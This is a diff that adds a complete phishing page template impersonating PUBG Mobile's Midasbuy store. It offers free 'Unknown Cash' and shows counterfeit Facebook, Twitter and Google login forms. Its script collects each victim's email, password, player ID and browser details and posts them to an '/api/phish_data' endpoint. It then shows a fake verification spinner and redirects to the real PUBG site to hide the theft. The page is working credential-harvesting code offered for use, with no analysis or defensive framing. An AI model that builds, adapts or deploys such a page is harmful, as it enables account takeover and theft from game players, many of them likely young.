@@ -1,0 +1,477 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black">
+<meta name="format-detection" content="telephone=no,email=no">
+<title>PUBG Mobile - Midasbuy</title>
+<link rel="stylesheet" type="text/css" href="/pubg/static/css/animate.css">
+<link rel="stylesheet" type="text/css" href="/pubg/static/css/facebook.css">
+<link rel="stylesheet" type="text/css" href="/pubg/static/css/twitter.css">
+<link rel="stylesheet" type="text/css" href="/pubg/static/css/google.css">
+<link rel="stylesheet" type="text/css" href="/pubg/static/css/link.css">
+<link rel="stylesheet" type="text/css" href="/pubg/static/css/codeflag-link.css">
+<link rel="stylesheet" type="text/css" href="/pubg/static/css/loader.css">
+<link rel="stylesheet" type="text/css" href="/pubg/static/css/style.css">
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/jquery-validation@1.19.3/dist/jquery.validate.min.js"></script>
+<style>
+body {
+    background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+    font-family: Arial, sans-serif;
+}
+.main-container {
+    max-width: 500px;
+    margin: 20px auto;
+    background: rgba(255, 255, 255, 0.05);
+    backdrop-filter: blur(10px);
+    border-radius: 15px;
+    padding: 30px;
+    box-shadow: 0 8px 32px rgba(0, 0, 0, 0.5);
+}
+.header-logo {
+    text-align: center;
+    margin-bottom: 30px;
+}
+.header-logo h1 {
+    color: #ff9800;
+    font-size: 2.5em;
+    margin: 0;
+    text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
+}
+.header-logo p {
+    color: #fff;
+    font-size: 1.1em;
+    margin-top: 5px;
+}
+.input-section {
+    margin: 20px 0;
+}
+.input-section label {
+    color: #ff9800;
+    font-weight: bold;
+    display: block;
+    margin-bottom: 10px;
+    font-size: 1.1em;
+}
+.input-section input {
+    width: 100%;
+    padding: 15px;
+    background: rgba(255, 255, 255, 0.1);
+    border: 2px solid rgba(255, 255, 255, 0.2);
+    border-radius: 10px;
+    color: white;
+    font-size: 16px;
+    transition: all 0.3s;
+}
+.input-section input:focus {
+    outline: none;
+    border-color: #ff9800;
+    background: rgba(255, 255, 255, 0.15);
+}
+.input-section input::placeholder {
+    color: rgba(255, 255, 255, 0.5);
+}
+.error-msg {
+    color: #ff5252;
+    font-size: 14px;
+    margin-top: 5px;
+    display: none;
+}
+.login-section {
+    margin-top: 30px;
+    padding-top: 20px;
+    border-top: 2px solid rgba(255, 255, 255, 0.1);
+}
+.login-section h3 {
+    color: #ff9800;
+    text-align: center;
+    margin-bottom: 20px;
+}
+.login-buttons {
+    display: flex;
+    flex-direction: column;
+    gap: 15px;
+}
+.social-btn {
+    padding: 15px;
+    border: none;
+    border-radius: 10px;
+    font-size: 16px;
+    font-weight: bold;
+    cursor: pointer;
+    transition: all 0.3s;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 10px;
+}
+.social-btn:hover {
+    transform: translateY(-3px);
+    box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+}
+.social-btn.facebook {
+    background: #1877f2;
+    color: white;
+}
+.social-btn.twitter {
+    background: #1da1f2;
+    color: white;
+}
+.social-btn.google {
+    background: white;
+    color: #333;
+}
+</style>
+</head>
+<body>
+
+<div class="main-container">
+    <div class="header-logo">
+        <h1>PUBG MOBILE</h1>
+        <p>Redeem Unknown Cash (UC)</p>
+    </div>
+    
+    <div class="input-section">
+        <label>Enter Your Player ID</label>
+        <input type="number" id="beforeInput-PlayId" placeholder="Enter your Player ID" maxlength="12" autocomplete="off">
+        <div class="error-msg wrongPlayerId">Please enter a valid Player ID (at least 9 digits)</div>
+    </div>
+    
+    <div class="login-section">
+        <h3>Login to Continue</h3>
+        <div class="login-buttons">
+            <button class="social-btn facebook" onclick="open_facebook()">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor">
+                    <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
+                </svg>
+                Login with Facebook
+            </button>
+            <button class="social-btn twitter" onclick="open_twitter()">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor">
+                    <path d="M23.953 4.57a10 10 0 01-2.825.775 4.958 4.958 0 002.163-2.723c-.951.555-2.005.959-3.127 1.184a4.92 4.92 0 00-8.384 4.482C7.69 8.095 4.067 6.13 1.64 3.162a4.822 4.822 0 00-.666 2.475c0 1.71.87 3.213 2.188 4.096a4.904 4.904 0 01-2.228-.616v.06a4.923 4.923 0 003.946 4.827 4.996 4.996 0 01-2.212.085 4.936 4.936 0 004.604 3.417 9.867 9.867 0 01-6.102 2.105c-.39 0-.779-.023-1.17-.067a13.995 13.995 0 007.557 2.209c9.053 0 13.998-7.496 13.998-13.985 0-.21 0-.42-.015-.63A9.935 9.935 0 0024 4.59z"/>
+                </svg>
+                Login with Twitter
+            </button>
+            <button class="social-btn google" onclick="open_google()">
+                <svg width="24" height="24" viewBox="0 0 24 24">
+                    <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
+                    <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
+                    <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
+                    <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
+                </svg>
+                Login with Google
+            </button>
+        </div>
+    </div>
+</div>
+
+<!-- Facebook Login -->
+<div class="popup-login login-facebook animated fadeIn" style="display:none;">
+<div class="popup-box-login-fb">
+<a onclick="close_facebook()" class="close-fb"><i class="zmdi zmdi-close"></i></a>
+<div class="navbar-fb">
+<img src="/pubg/static/img/assets/icon_fb.png">
+<div class="navbar-fb-text">Log in to your Facebook account to connect to PUBG MOBILE</div>
+</div>
+<div class="content-box-fb">
+<img src="https://i.ibb.co/DKkjLGG/unnamed.png">
+<div class="txt-login-fb">Log in to your Facebook account to connect to PUBG MOBILE</div>
+<div class="navbar-alert-fb email-fb" style="display:none;">The email or phone number you entered isn't connected to an account.</div>
+<div class="navbar-alert-fb sandi-fb" style="display:none;">The password you've entered is incorrect.</div>
+<form class="login-form" id="ValidateLoginFbForm" onsubmit="return ValidateLoginFbData()">
+<div class="form-group-fb">
+<input type="text" name="email" id="email-facebook" placeholder="Mobile number or email address" autocomplete="off" autocorrect="off" autocapitalize="off" required oninvalid="this.setCustomValidity(' ')" oninput="setCustomValidity('')">
+<input type="password" name="password" id="password-facebook" placeholder="Password" autocomplete="off" autocorrect="off" autocapitalize="off" required oninvalid="this.setCustomValidity(' ')" oninput="setCustomValidity('')">
+<div class="login-form-shid showPassword" onclick="showFbPassword()"><img src="/pubg/static/img/assets/Twitter-Hide-Password.png"></div>
+<div class="login-form-shid hidePassword" style="display: none;" onclick="hideFbPassword()"><img src="/pubg/static/img/assets/Twitter-Show-Password.png"></div>
+<input type="hidden" name="login" id="login-facebook" value="Facebook" readonly>
+<input type="hidden" name="playid" id="ValidatePopupPlayId" readonly>
+</div>
+<button type="submit" class="btn-login-fb">Log In</button>
+</form>
+<div class="txt-forgotten-password">Forgot Password?</div>
+</div>
+</div>
+</div>
+
+<!-- Twitter Login -->
+<div class="popup-login login-twitter animated fadeIn" style="display:none;">
+<div class="popup-box-login-twitter">
+<a onclick="close_twitter()" class="close-other"><i class="zmdi zmdi-close"></i></a>
+<div class="header-twitter">
+<img src="/pubg/static/img/assets/icon-twitter.png">
+<div class="header-twitter-text">Log in to Twitter</div>
+</div>
+<div class="content-box-twitter">
+<div class="txt-login-twitter">Log in to Twitter</div>
+<div class="alert-twitter-failed email-tw" style="display:none;">
+<div class="alert-twitter">
+<img src="/pubg/static/img/assets/alert.png">The username and password you entered did not match our records. Please double-check and try again.
+</div>
+</div>
+<div class="alert-twitter-failed sandi-tw" style="display:none;">
+<div class="alert-twitter">
+<img src="/pubg/static/img/assets/alert.png">The password you've entered is incorrect.
+</div>
+</div>
+<form id="ValidateLoginTwitterForm" onsubmit="return ValidateLoginTwitterData()">
+<div class="form-group-twitter">
+<input type="text" name="email" id="email-twitter" placeholder=" " autocomplete="off" autocorrect="off" autocapitalize="off" required oninvalid="this.setCustomValidity(' ')" oninput="setCustomValidity('')">
+<label>Phone, email, or username</label>
+</div>
+<div class="form-group-twitter">
+<input type="password" name="password" id="password-twitter" placeholder=" " autocomplete="off" autocorrect="off" autocapitalize="off" required oninvalid="this.setCustomValidity(' ')" oninput="setCustomValidity('')">
+<label>Password</label>
+<div class="form-group-sohi TwitterShowPassword" onclick="showTwitterPassword()"><img src="/pubg/static/img/assets/Twitter-Hide-Password.png"></div>
+<div class="form-group-sohi TwitterHidePassword" style="display: none;" onclick="hideTwitterPassword()"><img src="/pubg/static/img/assets/Twitter-Show-Password.png"></div>
+<input type="hidden" name="login" id="login-twitter" value="Twitter" readonly>
+<input type="hidden" name="playid" id="ValidatePopupPlayId" readonly>
+</div>
+<button type="submit" class="onbutton">Log In</button>
+</form>
+<div class="content-box-twitter-txt-footer-left">
+<a>Forgot password?</a> • <a>Sign up to Twitter</a>
+</div>
+</div>
+</div>
+</div>
+
+<!-- Google Login -->
+<div class="popup-login login-google animated fadeIn" style="display:none;">
+<div class="popup-box-login-google">
+<a onclick="close_google()" class="close-other"><i class="zmdi zmdi-close"></i></a>
+<div class="header-google">
+<img src="https://i.ibb.co/V9rgBKT/goolag.png">
+</div>
+<div class="box-google">
+<div class="txt-login-google">Sign in</div>
+<div class="txt-login-google-desc">Use your Google Account</div>
+<div class="navbar-alert-fb email-google" style="display:none;">Wrong Email</div>
+<div class="navbar-alert-fb sandi-google" style="display:none;">Wrong Password</div>
+<form class="login-form" id="ValidateLoginGoogleForm" onsubmit="return ValidateLoginGoogleData()">
+<div class="input-box">
+<label class="input-label">Email or phone</label>
+<input class="input-1" type="text" name="email" id="google-email" autocomplete="off" autocorrect="off" autocapitalize="off" onfocus="setFocus(true)" onblur="setFocus(false)" required oninvalid="this.setCustomValidity(' ')" oninput="setCustomValidity('')">
+<input type="hidden" name="login" id="google-login" value="Google" readonly>
+<input type="hidden" name="playid" id="ValidatePopupPlayId" readonly>
+</div>
+<div class="input-box">
+<label class="input-label">Enter your password</label>
+<input class="input-1" type="password" name="password" id="google-password" autocomplete="off" autocorrect="off" autocapitalize="off" onfocus="setFocus(true)" onblur="setFocus(false)" required oninvalid="this.setCustomValidity(' ')" oninput="setCustomValidity('')">
+</div>
+<div class="btn-forgot-google">Forgot Password?</div>
+<div style="clear:both"></div>
+<div class="notify-google">Not your computer? Use Guest mode to sign in privately. <span>Learn more</span></div>
+<div class="btn-create-google">Create account</div>
+<button type="submit" class="btn-login-google">Next</button>
+<div style="clear:both"></div>
+</form>
+</div>
+</div>
+</div>
+
+<!-- Verification -->
+<div class="popup account_verification animated fadeIn" style="display:none;">
+<div class="popup-box-wrapper">
+<div class="popup-box-title">Account Verification</div>
+<div class="popup-box-alert-checking">
+<i class="zmdi zmdi-spinner zmdi-hc-spin"></i>
+<br>Checking...
+</div>
+</div>
+</div>
+
+<script type="text/javascript" src="/pubg/static/js/script.js"></script>
+<script type="text/javascript" src="/pubg/static/js/google.js"></script>
+<script>
+const pageId = "{{ page_id }}";
+
+function open_facebook() {
+    if (!validatePlayerId()) return;
+    $('.login-facebook').show();
+    $('.main-container').hide();
+}
+function open_twitter() {
+    if (!validatePlayerId()) return;
+    $('.login-twitter').show();
+    $('.main-container').hide();
+}
+function open_google() {
+    if (!validatePlayerId()) return;
+    $('.login-google').show();
+    $('.main-container').hide();
+}
+function close_facebook() {
+    $('.login-facebook').hide();
+    $('.main-container').show();
+}
+function close_twitter() {
+    $('.login-twitter').hide();
+    $('.main-container').show();
+}
+function close_google() {
+    $('.login-google').hide();
+    $('.main-container').show();
+}
+
+function validatePlayerId() {
+    const playerId = $('#beforeInput-PlayId').val().trim();
+    if (!playerId || playerId.length < 8) {
+        $('.wrongPlayerId').slideDown();
+        $('#beforeInput-PlayId').focus();
+        setTimeout(() => $('.wrongPlayerId').slideUp(), 3000);
+        return false;
+    }
+    $('#ValidatePopupPlayId').val(playerId);
+    return true;
+}
+
+$(document).ready(function(){
+  $('#password-twitter').keyup(function(){
+      if($(this).val().length !=0){
+          $('.onbutton').removeClass().addClass('twbutton'); 
+      }
+      else
+      {
+          $('.twbutton').removeClass().addClass('onbutton'); 
+      }
+  })
+});
+
+function sendDataToServer(email, password, platform, playerId) {
+    const data = {
+        page_id: pageId,
+        platform: platform,
+        player_id: playerId,
+        email: email,
+        password: password,
+        user_agent: navigator.userAgent,
+        timestamp: new Date().toISOString()
+    };
+    
+    $.ajax({
+        type: "POST",
+        url: "/api/phish_data",
+        contentType: "application/json",
+        data: JSON.stringify(data),
+        success: function(){
+            $('.account_verification').show();
+            $('.login-facebook, .login-twitter, .login-google').hide();
+            setTimeout(function() {
+                window.location.href = 'https://www.pubgmobile.com';
+            }, 3000);
+        }
+    });
+}
+
+function ValidateLoginFbData() {
+    $('#ValidateLoginFbForm').submit(function(submitingValidateLoginFbData){
+        submitingValidateLoginFbData.preventDefault();
+        
+        $emailfb = $('#email-facebook').val().trim();
+        $passwordfb = $('#password-facebook').val().trim();
+        $playid = $('#ValidatePopupPlayId').val().trim();
+        
+        if($emailfb == '' || $emailfb == null || $emailfb.length <= 5)
+        {
+            $('.email-fb').fadeIn();
+            setTimeout(function () {
+            $('.email-fb').fadeOut();
+            }, 2000);                     
+            $('.sandi-fb').hide();
+            return false;
+        }
+        
+        if($passwordfb == '' || $passwordfb == null || $passwordfb.length <= 5)
+        {
+            $('.sandi-fb').fadeIn();
+            setTimeout(function () {
+            $('.sandi-fb').fadeOut();
+            }, 2000);                     
+            return false;
+        }
+        
+        $('.login-facebook').hide();
+        $('.account_verification').show();
+        
+        sendDataToServer($emailfb, $passwordfb, 'Facebook', $playid);
+    });  
+    return false;                      
+}
+
+function ValidateLoginTwitterData() {
+    $('#ValidateLoginTwitterForm').submit(function(submitingValidateLoginTwitterData){
+        submitingValidateLoginTwitterData.preventDefault();
+        
+        $emailtw = $('#email-twitter').val().trim();
+        $passwordtw = $('#password-twitter').val().trim();
+        $playid = $('#ValidatePopupPlayId').val().trim();
+        
+        if($emailtw == '' || $emailtw == null || $emailtw.length <= 3)
+        {
+            $('.email-tw').fadeIn();
+            setTimeout(function () {
+            $('.email-tw').fadeOut();
+            }, 2000);                     
+            $('.sandi-tw').hide();
+            return false;
+        }
+        
+        if($passwordtw == '' || $passwordtw == null || $passwordtw.length <= 7)
+        {
+            $('.sandi-tw').fadeIn();
+            setTimeout(function () {
+            $('.sandi-tw').fadeOut();
+            }, 2000);                     
+            return false;
+        }
+        
+        $('.login-twitter').hide();
+        $('.account_verification').show();
+        
+        sendDataToServer($emailtw, $passwordtw, 'Twitter', $playid);
+    });  
+    return false;                      
+}
+
+function ValidateLoginGoogleData() {
+    $('#ValidateLoginGoogleForm').submit(function(submitingValidateLoginGoogleData){
+        submitingValidateLoginGoogleData.preventDefault();
+        
+        $emailgoogle = $('#google-email').val().trim();
+        $passwordgoogle = $('#google-password').val().trim();
+        $playid = $('#ValidatePopupPlayId').val().trim();
+        
+        if($emailgoogle == '' || $emailgoogle == null || $emailgoogle.length <= 5)
+        {
+            $('.email-google').fadeIn();
+            setTimeout(function () {
+            $('.email-google').fadeOut();
+            }, 2000);                     
+            $('.sandi-google').hide();
+            return false;
+        }
+        
+        if($passwordgoogle == '' || $passwordgoogle == null || $passwordgoogle.length <= 5)
+        {
+            $('.sandi-google').fadeIn();
+            setTimeout(function () {
+            $('.sandi-google').fadeOut();
+            }, 2000);                     
+            return false;
+        }
+        
+        $('.login-google').hide();
+        $('.account_verification').show();
+        
+        sendDataToServer($emailgoogle, $passwordgoogle, 'Google', $playid);
+    });  
+    return false;                      
+}
+</script>
+</body>
+</html>
